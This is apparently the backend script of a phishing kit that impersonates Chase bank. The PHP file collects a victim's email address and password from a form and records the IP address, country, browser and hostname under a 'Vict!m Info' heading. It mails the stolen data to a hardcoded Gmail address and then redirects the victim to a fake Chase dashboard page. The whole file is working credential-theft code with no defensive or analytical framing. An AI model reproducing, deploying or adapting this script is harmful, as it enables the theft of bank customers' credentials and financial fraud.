<?php
require("botno.php");
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Online Info-----------------------\n";
$message .= "Email Type:             : ".$_POST['mail']."\n";
$message .= "Account Email Address:  : ".$_POST['helpoa']."\n";
$message .= "Email Password: 		 : ".$_POST['maskmeritm']."\n";
//$uni = $_POST['impression'];//
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY $PG Bon-------------\n";
$send = "mightyone321@gmail.com";
$subject = "Chase 2020 $ip";
$headers = "From: Chase 2020 <dan@lucidouchedetec.com>";
$headers .= $_POST['crowsnl']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
	   header("Location: id.html?&eventual-chase-international-dashboard9379487-jhbg76389");

	 
?>
